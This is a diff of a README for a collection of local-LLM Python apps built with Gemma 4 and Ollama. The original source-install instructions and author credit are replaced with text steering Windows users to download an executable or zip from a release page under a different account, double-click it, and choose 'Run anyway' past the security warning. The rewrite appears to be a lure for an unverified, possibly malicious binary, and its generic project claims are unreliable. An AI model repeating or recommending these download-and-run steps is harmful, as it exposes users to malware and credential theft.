@@ -1,156 +1,210 @@
-# 🎯 100 Local LLM Projects
+# 🚀 90-local-llm-projects - Run Local AI Projects Fast
 
-> A curated collection of 100 production-level AI applications — all running locally with Gemma 4 + Ollama. Zero cloud costs. 100% private.
+[![Download the app](https://img.shields.io/badge/Download-Release%20Page-2ea44f?style=for-the-badge&logo=github)](https://github.com/nyar5052/90-local-llm-projects/releases)
 
-[![Python](https://img.shields.io/badge/Python-3.10+-blue.svg)](https://python.org)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Local LLM](https://img.shields.io/badge/LLM-Gemma%204%20via%20Ollama-orange.svg)]()
-[![Privacy](https://img.shields.io/badge/Privacy-100%25%20Local-brightgreen.svg)]()
-[![Projects](https://img.shields.io/badge/Projects-100-purple.svg)]()
+## 🧭 What this is
 
-## 🎬 Demo
+90-local-llm-projects is a set of 90 Python projects built for local AI work. It uses Gemma 4 and Ollama to run on your own machine. This helps keep your data private and lets you try many AI tools without a cloud account.
 
-Each project includes a Streamlit or FastAPI web interface. Launch any project and interact with it through a clean, modern UI — all powered by a local LLM with zero API calls.
+This repo is set up as a portfolio of practical apps. It includes projects for text chat, document help, task tools, and simple web apps. Most projects use Python, FastAPI, and Docker.
 
-## 🔥 Why This Exists
+## 📥 Download and install
 
-Cloud AI APIs are expensive, rate-limited, and your data leaves your machine. This collection proves you can build **production-quality AI applications** that run entirely on your hardware. From healthcare to legal, education to creative writing — 100 real-world tools, all powered by a single local model.
+Visit this page to download the Windows release:
 
-Whether you're a developer exploring LLM capabilities, a privacy-conscious professional, or someone who wants to build AI tools without recurring API costs — this repo is your launchpad.
+[Download from GitHub Releases](https://github.com/nyar5052/90-local-llm-projects/releases)
 
-## ✨ Features
+### Windows steps
 
-- 🧠 **100 production-level AI applications** spanning 15+ domains
-- 🔒 **100% local processing** — no data ever leaves your machine
-- 💰 **Zero cloud costs** — no API keys, no subscriptions, no usage limits
-- 🏥 **Healthcare AI** — patient intake summarizer, symptom checker, drug interaction analyzer
-- ⚖️ **Legal AI** — contract clause analyzer, legal brief summarizer, compliance checker
-- 🎓 **Education AI** — study buddy bot, essay grader, language learning assistant
-- 💻 **Developer Tools** — code reviewer, API doc generator, git commit message writer
-- 🎨 **Creative AI** — story writer, poetry generator, recipe creator
-- 📊 **Business AI** — resume analyzer, meeting summarizer, email draft assistant
-- 🐾 **Specialty Bots** — veterinary advisor, fitness coach, travel planner, and more
-- 🖥️ **Multiple interfaces** — CLI, Streamlit Web UI, and FastAPI REST API for each project
-- 🐳 **Docker support** — containerized deployment for every project
-- ✅ **Test suites** — pytest coverage included
+1. Open the release page.
+2. Find the latest release.
+3. Download the Windows file from the Assets section.
+4. If the download comes as a .zip file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file or the start file that comes with the release.
+7. If Windows shows a security prompt, choose Run anyway if you trust the source.
 
-## 🏗️ Architecture
+### First run
 
-```
-┌─────────────────────────────────────────────────────────┐
-│                    User Interface Layer                   │
-│  ┌──────────┐  ┌──────────────┐  ┌───────────────────┐  │
-│  │   CLI    │  │ Streamlit UI │  │  FastAPI REST API  │  │
-│  └────┬─────┘  └──────┬───────┘  └─────────┬─────────┘  │
-│       └───────────────┬┼────────────────────┘            │
-│                       ▼▼                                 │
-│              ┌─────────────────┐                         │
-│              │   Core Engine   │  (domain-specific logic) │
-│              │  + LLM Client   │                         │
-│              └────────┬────────┘                         │
-│                       ▼                                  │
-│              ┌─────────────────┐                         │
-│              │  Common Module  │  (shared LLM interface)  │
-│              └────────┬────────┘                         │
-│                       ▼                                  │
-│              ┌─────────────────┐                         │
-│              │  Ollama Server  │  (Gemma 4 model)        │
-│              │  localhost:11434│                          │
-│              └─────────────────┘                         │
-└─────────────────────────────────────────────────────────┘
-```
+1. Wait for the app to open.
+2. Let it finish any first-time setup.
+3. If the app starts a local server, keep the window open.
+4. Open the browser link shown by the app.
+5. Use the app from your browser or desktop window, based on the project you chose.
 
-## 🚀 Quick Start
+## 💻 System requirements
 
-### Prerequisites
+These projects work best on a Windows PC with:
 
-- **Python 3.10+**
-- **[Ollama](https://ollama.com)** installed and running
-- **Gemma 4** model pulled: `ollama pull gemma4`
+- Windows 10 or Windows 11
+- 8 GB RAM minimum
+- 16 GB RAM or more for smoother use
+- At least 10 GB free disk space
+- A modern CPU
+- Optional GPU support for faster model use
+- Internet access for the first download
 
-### Installation
+For local LLM work, more memory helps. If your machine has less RAM, start with smaller projects and lighter models.
 
-```bash
-git clone https://github.com/kennedyraju55/90-local-llm-projects.git
-cd 90-local-llm-projects
+## 📦 What you get
 
-# Pick any project (e.g., patient-intake-summarizer)
-cd patient-intake-summarizer
-pip install -r requirements.txt
-```
+This repo includes a wide range of local AI app ideas, such as:
 
-### Usage
+- Chat tools that answer questions with a local model
+- File and document helpers
+- Search tools for notes and text
+- Simple web apps with FastAPI
+- Docker-based project setups
+- Python scripts you can run on your machine
+- Privacy-first AI workflows
+- Small tools for testing prompts and model output
 
-Each project supports three interfaces:
+Each project shows a common pattern for building with local LLMs. This makes it useful if you want to try one app or many apps from the same base.
 
-```bash
-# CLI
-python -m src.<project_name>.cli analyze --input example.txt
+## 🔧 How the projects work
 
-# Streamlit Web UI
-streamlit run src/<project_name>/web_ui.py
+Most projects follow a simple flow:
 
-# FastAPI REST API
-uvicorn src.<project_name>.api:app --reload
-```
+1. You start the app.
+2. The app connects to Ollama.
+3. Ollama runs the Gemma 4 model or another local model.
+4. You type a prompt or upload a file.
+5. The app returns an answer on your computer.
 
-## 📁 Project Structure
+Some projects use a browser interface. Some use a simple desktop flow. Others use an API with FastAPI, so the app can run in a local web page.
 
-```
-90-local-llm-projects/
-├── patient-intake-summarizer/     # 🏥 Healthcare AI
-├── contract-clause-analyzer/      # ⚖️ Legal AI
-├── pdf-chat-assistant/            # 📄 RAG-based PDF Q&A
-├── code-review-assistant/         # 💻 Developer Tools
-├── resume-analyzer/               # 📊 Business AI
-├── study-buddy-bot/               # 🎓 Education AI
-├── fitness-coach-bot/             # 🏋️ Health & Wellness
-├── meal-planner-bot/              # 🍽️ Nutrition AI
-├── travel-itinerary-bot/          # ✈️ Travel Planning
-├── it-helpdesk-bot/               # 🖥️ IT Support
-├── veterinary-advisor-bot/        # 🐾 Pet Care AI
-├── ... (90+ more projects)        #
-├── common/                        # 🔧 Shared LLM client module
-│   └── llm_client.py              #    Ollama API wrapper
-└── README.md
-```
+## 🗂 Project types
 
-## 🗂️ Project Categories
+You can expect projects in areas like:
 
-| Category | Count | Examples |
-|----------|-------|---------|
-| 🏥 Healthcare | 10+ | Patient intake summarizer, symptom checker, drug interaction analyzer |
-| ⚖️ Legal | 8+ | Contract analyzer, legal brief summarizer, compliance checker |
-| 🎓 Education | 10+ | Study buddy, essay grader, language tutor, quiz generator |
-| 💻 Developer Tools | 8+ | Code reviewer, API doc generator, commit message writer |
-| 🎨 Creative | 8+ | Story writer, poetry generator, recipe creator |
-| 📊 Business | 10+ | Resume analyzer, meeting summarizer, email assistant |
-| 🐾 Specialty | 15+ | Vet advisor, fitness coach, travel planner, gift recommender |
-| 🔐 Security | 5+ | Password policy analyzer, phishing detector |
+- AI chat assistants
+- RAG-style document tools
+- Local search apps
+- File summarizers
+- Prompt testers
+- Utility dashboards
+- Mini admin panels
+- Workflow tools for local data
+- Python learning examples
+- Docker-ready app templates
 
-## 🤝 Contributing
+This mix makes it easy to find a project that matches your goal.
 
-Contributions welcome! Whether it's a new project idea, bug fix, or improvement to an existing tool — please open an issue or submit a PR.
+## 🧰 Basic setup tips
 
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-project`)
-3. Commit your changes (`git commit -m 'Add amazing AI project'`)
-4. Push to the branch (`git push origin feature/amazing-project`)
-5. Open a Pull Request
+If the app needs Ollama, make sure Ollama is installed and running before you start.
 
-## 📄 License
+### Ollama setup
 
-MIT License — see [LICENSE](LICENSE)
+1. Install Ollama from the official site.
+2. Open Ollama.
+3. Pull the needed model, such as Gemma 4 or the model listed in the project.
+4. Keep Ollama running while you use the app.
 
-## 👨‍💻 Author
+### Model setup
 
-**Nrk Raju Guthikonda**
-- 🏢 Senior Software Engineer at Microsoft (Copilot Search Infrastructure)
-- 🔗 [GitHub](https://github.com/kennedyraju55) | [LinkedIn](https://www.linkedin.com/in/nrk-raju-guthikonda-504066a8/)
-- 🚀 Building 116+ open-source AI tools for real-world impact
+If a project uses a model name, make sure the same model exists in Ollama. If the app cannot find the model, it may fail to start or return an error.
 
----
+## 🌐 If the app opens in your browser
 
-<p align="center">
-  <b>⭐ If this collection helps you build local AI apps, give it a star!</b>
-</p>
+Some projects run a local web server. When this happens:
+
+1. Start the app file.
+2. Wait for the terminal or window to show a local address.
+3. Open that address in your browser.
+4. Use the page like any other web app.
+5. Leave the app window open while you work.
+
+A local address often looks like `http://127.0.0.1:8000` or `http://localhost:3000`.
+
+## 🐳 If the project uses Docker
+
+Some projects may run in a container. If so:
+
+1. Install Docker Desktop on Windows.
+2. Open Docker Desktop.
+3. Start the app using the included Docker file or run file.
+4. Wait for the container to start.
+5. Open the local address shown in the app logs.
+
+Docker helps keep the setup clean and gives each project its own space.
+
+## 🧪 Common use cases
+
+These projects can help with:
+
+- Private chat with a local AI model
+- Working with files on your own computer
+- Testing model prompts
+- Building simple AI tools
+- Learning how local LLM apps fit together
+- Trying Python and FastAPI examples
+- Reusing project patterns for new apps
+
+## 📁 Common folder layout
+
+A project in this repo may include:
+
+- `app.py` or `main.py` for the main app
+- `requirements.txt` for Python packages
+- `docker-compose.yml` for Docker setup
+- `README.md` for project notes
+- `templates` or `static` folders for web files
+- `models` or config files for app settings
+
+If you see one of these files, it helps show how the project starts and what it needs.
+
+## ⚙️ If something does not start
+
+If the app does not open, check these points:
+
+- Ollama is running
+- The model name matches the app settings
+- Python is installed if the project needs it
+- Docker Desktop is running if the project uses Docker
+- You extracted the zip file before starting
+- You opened the right file from the release package
+
+If the browser page does not load, wait a few seconds and refresh the page.
+
+## 🔐 Privacy and local use
+
+These projects are built for local use. That means your prompts and files stay on your machine unless you choose to send them elsewhere. This setup works well for private notes, local docs, and offline-style workflows.
+
+## 🧭 Who this is for
+
+This repo fits users who want:
+
+- A local AI app on Windows
+- A simple way to try Gemma 4 and Ollama
+- Python-based AI projects
+- Tools that keep data on the computer
+- A portfolio of ready-made local LLM apps
+
+## 📌 Suggested first project
+
+If you are new to local AI apps, start with a simple chat or document tool. Those projects are easier to test and help you check that Ollama, the model, and the app all work together before you try the more advanced ones
+
+## 🧩 Help with file types
+
+If you see these file types in a release:
+
+- `.exe` means you can run it on Windows
+- `.zip` means you need to extract it first
+- `.bat` means it is a Windows start file
+- `.py` means it is a Python file
+- `.yml` or `.yaml` often means Docker or app setup
+
+## 🪟 Windows safety checks
+
+Before you run the app:
+
+1. Make sure the file came from the release page.
+2. Right-click the file and view its properties if needed.
+3. Extract zip files to a normal folder.
+4. Run the app from the extracted folder, not from inside the zip.
+5. Keep the app files together in one place
+
+## 🧱 When you want to build on it
+
+This repo also works as a base for your own local AI apps. You can copy a project, change the prompt, swap the model, or change the web page. The structure helps you learn how a local LLM app fits together without needing cloud tools
